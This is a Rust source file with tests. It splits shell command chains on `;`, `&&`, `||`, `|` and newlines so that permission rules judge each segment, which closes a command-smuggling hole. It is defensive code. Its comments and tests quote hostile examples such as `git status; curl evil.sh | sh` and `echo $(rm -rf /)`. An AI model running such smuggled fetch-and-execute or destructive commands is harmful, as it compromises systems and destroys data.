//! Quote-aware splitting of a shell command into its `;`/`&&`/`||`/`|`/newline
//! chain segments, for chain-aware permission rules.
//!
//! A permission rule matched against the whole command string lets a second
//! command ride along: `shell:git status*` matches `git status; curl evil.sh
//! | sh`. Splitting the chain and judging each segment closes that. This is
//! deliberately not a shell parser: `$(` and backticks are inert characters
//! inside their segment (so `echo $(rm -rf /)` is one segment whose program
//! is `echo` — prefix rules trust the program, which is documented in
//! tools.md), and `sh -c 'inner'` is one segment too. The quote toggling
//! follows `shell.rs::contains_shell_control`, which serves the separate
//! `allowed_commands` path.

/// Split `cmd` on the shell chain operators — `;`, `&&`, `||`, `|`, and
/// newlines — outside single/double quotes. Backslash escapes the next
/// character everywhere except inside single quotes (where it is literal).
/// Each segment is trimmed; empty segments are dropped. A command that
/// yields no non-empty segments (empty or whitespace-only) comes back as a
/// single raw segment, so degenerate input stays reachable by exact globs
/// rather than matching nothing.
pub fn split_command_chain(cmd: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = cmd.chars().peekable();
    while let Some(ch) = chars.next() {
        match ch {
            // A backslash is an escape outside single quotes: the next
            // character (a quote, a separator, anything) joins this segment.
            '\\' if !in_single => {
                current.push(ch);
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            '\'' if !in_double => {
                in_single = !in_single;
                current.push(ch);
            }
            '"' if !in_single => {
                in_double = !in_double;
                current.push(ch);
            }
            ';' | '\n' if !in_single && !in_double => end_segment(&mut current, &mut segments),
            '|' if !in_single && !in_double => {
                // `||` and `|` split identically; consume the pair.
                if chars.peek() == Some(&'|') {
                    chars.next();
                }
                end_segment(&mut current, &mut segments);
            }
            '&' if !in_single && !in_double => {
                // `&&` chains, and a lone `&` backgrounds — both are a
                // boundary between invocations.
                if chars.peek() == Some(&'&') {
                    chars.next();
                }
                end_segment(&mut current, &mut segments);
            }
            _ => current.push(ch),
        }
    }
    end_segment(&mut current, &mut segments);
    if segments.is_empty() {
        vec![cmd.to_string()]
    } else {
        segments
    }
}

fn end_segment(current: &mut String, segments: &mut Vec<String>) {
    let segment = current.trim();
    if !segment.is_empty() {
        segments.push(segment.to_string());
    }
    current.clear();
}

/// The program name of each chain segment — the first whitespace token —
/// for docs and UX ("this runs git, then curl"). Segments whose program
/// cannot be extracted (empty after trimming) are skipped.
pub fn chain_invocations(cmd: &str) -> Vec<String> {
    split_command_chain(cmd)
        .iter()
        .filter_map(|segment| {
            segment
                .split_whitespace()
                .next()
                .map(|token| token.to_string())
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn splits_on_every_chain_operator() {
        assert_eq!(split_command_chain("git status"), vec!["git status"]);
        assert_eq!(split_command_chain("git status; npm test"), vec!["git status", "npm test"]);
        assert_eq!(split_command_chain("git status && npm test"), vec!["git status", "npm test"]);
        assert_eq!(split_command_chain("git fetch || npm ci"), vec!["git fetch", "npm ci"]);
        assert_eq!(split_command_chain("curl -s x | sh"), vec!["curl -s x", "sh"]);
        assert_eq!(split_command_chain("git status\nnpm test"), vec!["git status", "npm test"]);
    }

    #[test]
    fn quoted_operators_stay_in_their_segment() {
        assert_eq!(split_command_chain("echo 'a;b'"), vec!["echo 'a;b'"]);
        assert_eq!(split_command_chain("echo 'a;b' && echo done"), vec!["echo 'a;b'", "echo done"]);
        assert_eq!(
            split_command_chain("grep '|footer|' file && wc -l file"),
            vec!["grep '|footer|' file", "wc -l file"]
        );
    }

    #[test]
    fn escaped_quotes_and_semicolons_stay_in_their_segment() {
        // `\"` inside double quotes is a literal quote, not a terminator.
        assert_eq!(
            split_command_chain("echo \"a\\\"b;c\" && echo done"),
            vec!["echo \"a\\\"b;c\"", "echo done"]
        );
        // Outside quotes, `\;` is an escaped literal semicolon.
        assert_eq!(split_command_chain("echo a\\;b && echo done"), vec!["echo a\\;b", "echo done"]);
    }

    #[test]
    fn substitution_is_inert_text() {
        // Deliberately NOT parsed: `$(...)` and backticks are just characters
        // in their segment, matching the detector's honesty level.
        assert_eq!(split_command_chain("echo $(git status)"), vec!["echo $(git status)"]);
        assert_eq!(split_command_chain("echo `git status`"), vec!["echo `git status`"]);
    }

    #[test]
    fn empty_and_trailing_segments_are_dropped() {
        assert_eq!(split_command_chain("git status;"), vec!["git status"]);
        assert_eq!(split_command_chain("git status;; && npm test"), vec!["git status", "npm test"]);
        assert_eq!(
            split_command_chain("   "),
            vec!["   "],
            "zero segments falls back to the raw string"
        );
        assert_eq!(split_command_chain(""), vec![""]);
    }

    #[test]
    fn single_command_passes_through() {
        assert_eq!(split_command_chain("git status -s"), vec!["git status -s"]);
        assert_eq!(split_command_chain("  git status  "), vec!["git status"]);
    }

    #[test]
    fn invocations_are_the_first_tokens() {
        assert_eq!(
            chain_invocations("git status && npm test; echo done"),
            vec!["git", "npm", "echo"]
        );
        assert_eq!(chain_invocations("echo 'a|b'"), vec!["echo"]);
    }
}
